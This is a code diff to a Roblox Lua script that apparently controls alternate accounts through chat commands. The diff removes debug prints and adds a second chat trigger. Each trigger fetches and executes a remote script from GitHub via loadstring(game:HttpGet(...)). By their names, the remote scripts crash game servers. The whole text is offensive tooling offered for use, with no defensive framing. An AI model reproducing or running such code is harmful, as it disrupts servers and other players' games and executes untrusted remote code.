@@ -11,13 +11,11 @@ for _, player in pairs(game:GetService("Players"):GetPlayers()) do
 		player.Chatted:Connect(function(message)
 			if message:match(getgenv().Settings.prefix .. "encrypt") then
 				if game.Players.LocalPlayer.UserId == getgenv().Alts.Alt1 then
-					print("this is alt1")
 					loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dhcquickcrash.lua"))()
-				else
-					-- TODO: Remove else catch (This is to test if everything works fine)
-					print("not alt1")
-				end
-			end
+                		end
+			elseif message:match(getgenv().Settings.prefix .. "swag") then
+                		loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+            		end
 		end)
 	end
 	
